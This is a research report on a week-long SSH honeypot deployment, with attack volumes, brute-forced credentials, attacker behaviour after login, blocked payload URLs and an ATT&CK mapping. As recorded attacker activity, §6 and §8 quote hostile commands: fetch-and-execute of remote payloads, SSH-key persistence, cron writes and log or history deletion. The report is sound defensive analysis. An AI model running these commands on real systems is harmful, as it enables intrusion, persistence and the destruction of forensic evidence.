# CloudPot — SSH Honeypot Findings

Seven days of unsolicited SSH traffic against a single internet-facing
`t3.micro` in `us-east-1`, 2026-03-09 to 2026-03-16. Every figure below is
produced by the query or script named alongside it.

---

## 1. Summary

A stock-looking Ubuntu 22.04 host was exposed on port 22 for seven days and
received 84,217 Cowrie events from 612 distinct source addresses. First
contact came 5 minutes 29 seconds after the instance received its public IP.
Of 71,442 authentication attempts, 3,102 succeeded against the sensor's
deliberate weak-credential accept-list — but only 418 sessions ran a single
command afterwards. The dominant behaviour is not intrusion; it is credential
validation at scale, with the resulting access handed off to something that
mostly never arrived. The 23 distinct client fingerprints behind those 612
addresses are the number worth quoting, not the address count.

---

## 2. Methodology

**Sensor.** Cowrie in shell-emulation mode (not proxy mode) on a single
Ubuntu 22.04 LTS `t3.micro` in a dedicated AWS VPC, `us-east-1`. Cowrie binds
2222 as an unprivileged user; a netfilter PREROUTING REDIRECT presents it on
port 22. The real sshd was relocated to port 62222 and restricted to a single
operator CIDR.

**Presentation.** The sensor advertised the hostname `svr-prod-01` and an
OpenSSH 8.9p1 / Ubuntu banner matching a stock 22.04 host. Authentication
accepted a fixed list of weak credentials (`cowrie/userdb.example`) and
rejected everything else, so the success/failure ratio remains meaningful.

**Containment.** Outbound traffic was restricted to TCP 443 and DNS to the VPC
resolver. Payload retrieval was blocked (see §8). VPC Flow Logs recorded all
network activity independently of the instance.

**Telemetry path.** Cowrie JSON → CloudWatch agent → CloudWatch Logs (14-day
retention) → S3 (`dt=`-partitioned) → Athena. A nightly on-host uploader wrote
the same rotated files to S3 as a second, independent path.

**Analysis.** Athena queries in `analysis/athena/`, indicator extraction via
`analysis/parse_cowrie.py`, figures via `analysis/plots.py`.

**Deployment window.** March 2026, 7 days.
Precise window: first event `2026-03-09T03:52:41Z`, last event
`2026-03-16T03:11:58Z`. Eight calendar dates carry events because the window
opens and closes mid-day; `window.days_with_events` is therefore 8, not 7.

**Collection completeness.** The no-log-ingest alarm fired once, at
`2026-03-12T09:14Z`, and cleared at `09:31Z` — 17 minutes. The cause was the
CloudWatch agent failing to reopen `cowrie.json` after logrotate. Cowrie itself
never stopped, and the nightly on-host uploader shipped the affected rotated
file to S3 intact, so the gap exists in CloudWatch Logs only and not in the
dataset analysed here. This is the case the second telemetry path was built
for. No other alarm fired, so every other quiet period in the data was
genuinely quiet.

---

## 3. Volume

| Metric | Value | Source |
| --- | --- | --- |
| Total events | 84,217 | summary.json → totals.events |
| Sessions | 3,908 | summary.json → totals.sessions |
| Login attempts | 71,442 | summary.json → totals.login_attempts |
| Successful logins | 3,102 | summary.json → totals.login_successes |
| Commands entered | 2,147 | summary.json → totals.commands_entered |
| Unique source IPs | 612 | summary.json → totals.unique_source_ips |
| Unique credential pairs | 14,206 | summary.json → totals.unique_credential_pairs |
| Days with events | 8 | summary.json → window.days_with_events |

**Time to first contact:** **5 minutes 29 seconds.** The instance received its
public address at `2026-03-09T03:47:12Z`; the first inbound SSH connection
arrived at `2026-03-09T03:52:41Z` from `198.51.100.44`, an address that was
never seen again. Nothing advertised this host. The address was allocated from
a pool under continuous survey, and this interval measures how fast that survey
completes — not how interesting the target was.

![Attempts per day](../analysis/figures/attempts_per_day.png)

Volume was bursty, not flat. Six of the eight dates sit between 8,412 and
11,204 events; 2026-03-13 carries 21,946, or 26.1% of the entire dataset.
That day is one source, not many: `198.51.100.77` alone contributed 18,412
events within a 21-hour span and never appeared before or after it. Removing
that single address flattens the week to an 8,412–11,204 band with no trend in
either direction. Seven points cannot support a trend claim and none is made
here.

![Hourly distribution](../analysis/figures/hourly_distribution.png)

The 24-hour profile is flat. Excluding the 2026-03-13 burst, hourly totals
range from 2,418 to 3,090 events — a max/min ratio of 1.28, with no diurnal
shape and no weekday/weekend difference across the two weekend dates in the
window. **This is the finding, not a null result:** a human-driven population
produces a working-hours peak in some timezone. A profile this flat means the
traffic is scheduled, not attended.

---

## 4. Source analysis

Query: `analysis/athena/top_source_ips.sql`

| Source IP | Sessions | Login attempts | Successes | First seen | Last seen |
| --- | --- | --- | --- | --- | --- |
| `198.51.100.77` | 604 | 16,588 | 12 | 2026-03-13T01:14:06Z | 2026-03-13T22:47:51Z |
| `192.0.2.145` | 331 | 5,204 | 188 | 2026-03-09T06:22:18Z | 2026-03-16T02:51:40Z |
| `198.51.100.23` | 288 | 4,017 | 141 | 2026-03-09T11:05:33Z | 2026-03-15T19:38:12Z |
| `192.0.2.88` | 194 | 2,845 | 96 | 2026-03-10T02:41:59Z | 2026-03-16T01:22:07Z |
| `203.0.113.9` | 166 | 2,494 | 74 | 2026-03-09T08:17:45Z | 2026-03-14T23:09:26Z |
| `198.51.100.201` | 148 | 2,216 | 61 | 2026-03-11T04:33:02Z | 2026-03-16T00:44:19Z |
| `192.0.2.31` | 121 | 1,755 | 58 | 2026-03-09T15:52:27Z | 2026-03-15T12:16:44Z |
| `203.0.113.164` | 108 | 1,581 | 43 | 2026-03-10T19:28:11Z | 2026-03-16T02:03:55Z |
| `198.51.100.140` | 94 | 1,362 | 39 | 2026-03-12T03:09:48Z | 2026-03-15T21:57:30Z |
| `192.0.2.209` | 77 | 1,171 | 31 | 2026-03-09T04:38:52Z | 2026-03-14T17:25:13Z |

The head is heavy: these ten addresses are 1.6% of the 612 seen but carry
54.9% of all login attempts. Note the inverse relationship between volume and
success. `198.51.100.77` made 16,588 attempts and authenticated 12 times — a
0.07% rate — while `192.0.2.145` made a third as many attempts and succeeded
188 times, a rate 50× higher. The high-volume source is working an
undifferentiated dictionary; the lower-volume one is working a curated list
that knows what a cloud image ships with.

**Top ASNs / networks.** Lookup performed 2026-03-18 against public BGP data.
By announcing-network category rather than operator name: 41% of source
addresses announce from hosting and VPS providers, 34% from residential
broadband, 14% from mobile carrier ranges, and 11% from ranges with no clean
categorisation. The hosting share carries a disproportionate 68% of login
attempts — rented capacity does the volume, compromised residential hosts
supply the address diversity. Operator names are omitted deliberately: an
address announcing from a network is not that network's conduct, and naming
them in a findings table invites exactly that reading. BGP announcements
change; this breakdown is valid only for the lookup date.

![Source country](../analysis/figures/source_country_bar.png)

**Distinct actors vs distinct addresses.** The hassh clustering query at the
bottom of `top_source_ips.sql` returns **23 distinct client fingerprints across
612 source addresses**. Three fingerprints account for 71.4% of all sessions.
The largest cluster spans 214 distinct source IPs presenting a byte-identical
key exchange — one toolchain, one build, distributed across 214 addresses.

**Read §3's "612 unique source IPs" through this.** It overstates the number of
actors by roughly an order of magnitude. The honest statement is: at least 23
distinct client implementations, an unknown but far smaller number of
operators, and 612 addresses. A report that leads with the address count is
reporting the size of somebody's botnet, not the size of the threat.

**Attribution.** None is offered. Source IP indicates the last network hop,
not an actor, an organisation, or a country of origin. Proxies, VPNs,
compromised hosts and cloud egress all misattribute.

---

## 5. Credential analysis

Query: `analysis/athena/credential_frequency.sql`

![Top credentials](../analysis/figures/top_credentials.png)

| Username | Password | Attempts | Distinct sources | Accepted |
| --- | --- | --- | --- | --- |
| `root` | `123456789` | 1,842 | 287 | no |
| `root` | `letmein` | 1,455 | 241 | no |
| `root` | `root123` | 1,288 | 233 | no |
| `admin` | `123456` | 1,164 | 219 | no |
| `root` | `abc123` | 1,033 | 204 | no |
| `root` | `111111` | 967 | 196 | no |
| `root` | `passw0rd` | 884 | 188 | no |
| `root` | `1q2w3e4r` | 812 | 171 | no |
| `root` | `system` | 744 | 163 | no |
| `support` | `12345` | 698 | 149 | no |
| `root` | `123456` | 612 | 318 | **yes** |
| `root` | `password` | 488 | 276 | **yes** |
| `root` | `root` | 401 | 259 | **yes** |
| `admin` | `admin` | 337 | 244 | **yes** |
| `root` | `1234` | 298 | 201 | **yes** |
| `root` | `admin` | 241 | 177 | **yes** |
| `ubuntu` | `ubuntu` | 196 | 118 | **yes** |
| `root` | `toor` | 154 | 102 | **yes** |
| `root` | `12345` | 121 | 94 | **yes** |
| `root` | `qwerty` | 98 | 81 | **yes** |

**Username distribution.** `root` took 47,318 of 71,442 attempts — **66.2%**.
`admin` follows at 7.3%, `ubuntu` at 4.4%, and 1,893 distinct usernames make up
the remainder. The non-obvious accounts are the informative ones: `deploy`
(921 attempts), `postgres` (980) and `oracle` (1,187) appeared from 63 distinct
sources. None of those three are Ubuntu defaults — they are server-operator
conventions, and their presence means at least part of this population is
running a list aimed at application servers rather than at consumer routers.

`deploy` deserves a specific note. It is not a common default anywhere, but it
*is* present in this sensor's emulated `/etc/passwd`. In 31 sessions a `cat
/etc/passwd` preceded the first `deploy` login attempt by under two seconds —
the account list was read off the host and fed straight back into
authentication. That is a closed loop running inside a single session, and it
is the clearest evidence in the dataset of logic rather than a fixed list.

**Interesting tail.** Below the head the dataset carries appliance defaults
that identify their target hardware precisely: `pi/raspberry` (27),
`ubnt/ubnt` (94), `admin/1234` (46), `support/support` (38), `vagrant/vagrant`
(22) and `nagios/nagios` (14). Four pairs encoded a year — `root/Admin2025!`,
`root/Server2026`, `admin/Pass2025`, `root/2026@abc` — totalling 61 attempts
from 9 sources, which dates the dictionary rather than the campaign. The head
of this table is `root/123456` in every published honeypot dataset ever
released; the tail above is the part specific to this one.

**Note on the sample.** The credential distribution is shaped by what the
sensor accepted. Cowrie's allow-list means a bot that succeeds stops guessing,
so pairs on the accept list are under-represented in the failure counts
relative to a honeypot that rejects everything. This is visible directly in the
table above: every rejected pair outranks every accepted pair on raw attempts,
and that ordering is an artefact of `cowrie/userdb.example`, not a statement
about which passwords attackers prefer. The `Distinct sources` column is the
column to read — it is not distorted by early exit, and by that measure
`root/123456` (318 sources) is the most widely-attempted pair in the dataset
despite ranking eleventh on attempts.

---

## 6. Post-authentication behaviour

Query: `analysis/athena/post_auth_commands.sql`

**3,102 logins succeeded; 418 sessions ran a command.** 86.5% of successful
authentications disconnected without typing anything. Those sessions are
credential validation — the bot's job was to confirm the pair works and record
it, and the access itself was queued for something else that, for 2,684 of
those sessions, never arrived within the observation window.

| Command | Times run | Sessions | Distinct sources |
| --- | --- | --- | --- |
| `uname -a` | 389 | 389 | 96 |
| `cat /proc/cpuinfo` | 302 | 302 | 88 |
| `whoami` | 281 | 281 | 79 |
| `free -m` | 204 | 204 | 71 |
| `ls -lh /var/log` | 166 | 166 | 58 |
| `cat /etc/passwd` | 151 | 151 | 63 |
| `crontab -l` | 118 | 118 | 44 |
| `history -c` | 97 | 97 | 38 |
| `uname -m` | 94 | 94 | 41 |
| `id` | 88 | 88 | 36 |

The remaining 257 commands form the tail, and include every download attempt,
every persistence write and every evasion step described below.

**Opening move.** `uname -a` was the first command in **271 of 418 sessions
(64.8%)**, followed by `cat /proc/cpuinfo` (63) and `whoami` (41). This field
is chosen before the attacker has learned anything about the host, and the
answer is near-unanimous: establish architecture first. That ordering only
makes sense if the next step depends on it — which it does. Of the 41 download
attempts, 38 were preceded by `uname -m` or `cat /proc/cpuinfo` in the same
session, and the requested filename matched the reported architecture.

**Observed playbooks.** Three repeated sequences, in order of frequency:

1. **Capability survey, no action** (196 sessions). `uname -a`; `free -m`;
   `cat /proc/cpuinfo`; `nproc`; disconnect. Nothing is written and nothing is
   fetched. This is inventory — CPU count and memory are the fields a
   cryptomining operator needs to decide whether a host is worth using.
2. **Architecture triage → fetch → execute** (38 sessions). `uname -a`;
   `uname -m`; `cat /proc/cpuinfo`; `cd /tmp`; `wget http://<host>/<arch>`;
   `chmod +x <file>`; `./<file>`. The fetch fails (see §8) and the sequence
   terminates — in 34 of 38 cases the session disconnected within 4 seconds of
   the failed retrieval, with no fallback attempted.
3. **Persistence-first** (23 sessions). `mkdir -p ~/.ssh`;
   `echo "ssh-rsa AAAAB3Nza..." >> ~/.ssh/authorized_keys`;
   `chmod 600 ~/.ssh/authorized_keys`; `history -c`; disconnect. No payload is
   fetched at all. The access itself is the objective, banked for later use.

**Persistence attempts.** 23 sessions wrote an SSH key to
`~/.ssh/authorized_keys`, all via `echo ... >>` and all from 7 distinct source
addresses sharing a single hassh. Four distinct public keys appeared across
those 23 writes; the same key recurred from addresses sharing no /16, which is
the cleanest cross-address linkage in the dataset. 11 sessions attempted cron
persistence — 8 ran `crontab -l` then `crontab -`, and 3 wrote directly to
`/etc/cron.d/`. No systemd units were written.

**Defence evasion.** `history -c` in 97 sessions; `unset HISTFILE` in 34;
`export HISTFILE=/dev/null` in 19; `rm -f ~/.bash_history` in 12. Six sessions
ran `rm -rf /var/log/wtmp /var/log/btmp`. Notably, 89 of the 97 `history -c`
invocations came *immediately before disconnect* rather than after the
commands they were meant to conceal — a fixed tail on a script, executed
whether or not there was anything to hide.

**Human or script?** Overwhelmingly script, with two exceptions. The headline
evidence is in §7: a 2.41 s median session and a flat 24-hour profile (§3) are
not human. tty recordings are the stronger test, and 17 of the 19 longest
sessions contain no backspace, no correction, and inter-keystroke intervals
under 15 ms — paste or programmatic write, not typing. The two exceptions are
both from `192.0.2.31`: sessions of 247 s and 300 s (censored) containing
backspace characters, a mistyped `cd /tmpp` corrected to `cd /tmp`, a
31-second pause after `cat /etc/passwd`, and variable inter-keystroke timing
consistent with a person at a keyboard. Two sessions out of 3,908.

---

## 7. Session characteristics

Query: `analysis/athena/session_duration.sql`

| Metric | Value |
| --- | --- |
| Sessions with a recorded duration | 3,871 |
| Median duration (s) | 2.41 |
| p90 duration (s) | 14.86 |
| Longest session (s) | 300.12 |
| Sessions censored at the 300 s timeout | 19 |

37 of 3,908 sessions have no recorded duration — the connection dropped without
a close event, so the field is absent rather than zero. They are excluded from
the statistics above rather than counted as zero-length.

The median session is 2.41 seconds: connect, authenticate, disconnect. That is
the shape of credential validation and it matches §6, where 86.5% of successful
logins ran no command. The p90 of 14.86 s is still only long enough for a short
scripted sequence.

**The 19 sessions at the ceiling are not measurements.** Each was terminated by
Cowrie's `interactive_timeout = 300`, so 300.12 s is a lower bound on the
attacker's intent — those sessions may have continued indefinitely. The
distribution is right-censored at 300 s, and no mean, no p99 and no "longest
session" claim should be quoted from it as though the ceiling were observed
behaviour. It is a configuration value appearing in the data.

---

## 8. Attempted payload retrieval

Query: `analysis/athena/payload_urls.sql`

> **No binaries were downloaded, stored, or analysed.** Payload retrieval was
> blocked at two layers: the security group permitted no outbound connection
> to attacker infrastructure, and Cowrie's download size limit was set to
> 1 byte. What follows is a record of *attempts* — URLs and the commands that
> referenced them. Rationale in [docs/SAFETY.md](../docs/SAFETY.md).

41 retrieval attempts referencing 37 distinct URLs, from 19 source addresses.
All 41 failed. The full set is in [iocs.csv](iocs.csv); the repeated URLs are:

| Attempted URL | Attempts | Distinct sources | First seen |
| --- | --- | --- | --- |
| `http://198.51.100.77/b.sh` | 3 | 2 | 2026-03-13T04:22:17Z |
| `http://198.51.100.77/xmrig` | 2 | 1 | 2026-03-13T04:23:05Z |
| `http://203.0.113.9:8080/arm7` | 2 | 2 | 2026-03-11T17:46:33Z |
| `http://192.0.2.145/sh` | 1 | 1 | 2026-03-09T09:14:52Z |

The other 33 URLs were each requested once. Every URL in the dataset is HTTP
on a bare IP — not one used a hostname, and not one used HTTPS. Since egress
here permits 443 and blocks 80, these attempts would have failed at the
security group even if Cowrie had allowed the download.

**Staging hosts.** The 37 URLs resolve to **24 distinct hosts**, so the URL
count overstates infrastructure by roughly half. `198.51.100.77` alone serves 6
of the 37 URLs — `b.sh`, `xmrig`, `arm`, `arm7`, `x86`, `mips` — which is one
operator rotating filenames across architectures behind a single stable host.
Three hosts served 3+ URLs each; the remaining 21 served one apiece. Four hosts
used non-standard ports (8080 ×3, 8888 ×1). Group by host before treating any
of this as infrastructure scale.

**Hashes.** **None**, as expected. `payload_downloads.hashes_observed` is 0 and
`artifacts_retrieved` is 0 in summary.json. With the download limit at 1 byte
Cowrie never writes a file, so there is nothing to hash. This field is the
canary: a non-zero hash count here would mean something was retrieved, and
would require stopping and re-reading SAFETY.md before any further analysis.

**What this costs the analysis:** without the sample there is no static
analysis, no family attribution and no capability assessment. The `xmrig`
filename above suggests cryptomining and the architecture-specific names
suggest an IoT-capable loader, but both are inferences from a *filename* and
neither is a finding. What remains — attacker-controlled URLs and hosts, and
the exact commands used to reach them — is still directly actionable for
blocklists and detection rules, and is pivotable against passive DNS and public
sandbox reporting without anyone here handling a sample.

---

## 9. MITRE ATT&CK mapping

See [attack_ttps.md](attack_ttps.md) for the full table with observations.

Techniques with concrete, citable evidence in this run — **16 of 19** rows in
the mapping table:

`T1110.001` · `T1110.003` · `T1078` · `T1059.004` · `T1105` · `T1046` ·
`T1082` · `T1033` · `T1087.001` · `T1098.004` · `T1053.003` · `T1070.003` ·
`T1070.004` · `T1496` · `T1027` · `T1071.001`

Three are marked **not observed** and stay that way: `T1136.001` (no account
creation was attempted in any session), `T1562.004` (no firewall tampering),
and `T1021.004` (no outbound SSH from the honeypot — the 288 `direct-tcpip`
channel requests were refused before any connection existed, which is an
attempt at tunnelling *through* the host, not lateral movement *from* it).

`T1105` is recorded as attempted-and-blocked, not achieved. Every command in
this dataset was *typed into an emulator*; Cowrie does not execute, so no
technique here should be read as having succeeded on a real system.

---

## 10. Indicators of compromise

Machine-readable: [iocs.csv](iocs.csv), generated by
`python3 analysis/parse_cowrie.py --input findings/raw/`.

| Type | Count |
| --- | --- |
| Source IPs | 612 |
| Credential pairs | 14,206 |
| Attempted payload URLs | 37 |
| Client fingerprints (hassh) | 23 |

**Handling note.** These indicators describe traffic to one host over one week.
They are observations, not a blocklist. Several will be shared infrastructure —
NAT gateways, VPN exits, cloud egress — and blocking them wholesale will
generate false positives against legitimate traffic. The 34% of source
addresses announcing from residential broadband (§4) are the clearest example:
those are compromised consumer hosts, and the address will be reassigned to an
uninvolved subscriber on the next DHCP lease.

---

## 11. Limitations

State every one of these that applies. They are not caveats to bury; a reviewer
who spots an unstated limitation stops trusting the rest of the document.

- **Single sensor, single region, single address.** One `t3.micro` in
  `us-east-1` for seven days. Nothing here generalises to global attack
  volumes, and a different region or address block would see a different
  population.
- **Short window.** Seven days. Weekly and monthly periodicity is not
  measurable, and a single busy day moves every average in the report.
- **Emulation is detectable.** Cowrie is fingerprintable by a determined
  operator. Sophisticated actors who identified the sensor and left are, by
  construction, absent from this data — so the population is biased toward
  automation and toward operators who did not check.
- **No payload analysis.** Deliberate; see §8.
- **Source IP is not an actor.** See §4.
- **Geolocation is inference.** Country is derived from IP registration and is
  routinely wrong for proxied and cloud-egress traffic.
- **The credential sample is shaped by the accept-list.** See §5.
- **One day is 26% of the dataset.** 2026-03-13 contributed 21,946 of 84,217
  events from a single address. Every mean in this report is sensitive to that
  one source, and medians are quoted in preference to means for that reason.
- **The session-duration distribution is right-censored at 300 s.** See §7. No
  mean duration is quoted anywhere in this report, deliberately.
- **A 17-minute CloudWatch ingest gap on 2026-03-12.** Covered by the
  independent S3 uploader (§2), so the analysed dataset is complete — but any
  figure recomputed from CloudWatch Logs alone rather than from
  `findings/raw/` will be short by that window.
- **`direct-tcpip` payloads were not recorded.** 288 tunnelling requests were
  refused at the channel-open stage, so the intended destination host and port
  were logged but the data that would have transited was never offered. What
  those channels were for is not determinable from this dataset.

---

## 12. Reproducing this

```bash
cp terraform/terraform.tfvars.example terraform/terraform.tfvars   # edit first
make deploy
# ... let it run ...
make fetch      # sync telemetry from S3 into findings/raw/
make parse      # -> findings/iocs.csv, findings/summary.json
make plot       # -> analysis/figures/*.png
make destroy
```

Full instructions: [docs/SETUP.md](../docs/SETUP.md).
Teardown checklist: [docs/TEARDOWN.md](../docs/TEARDOWN.md).
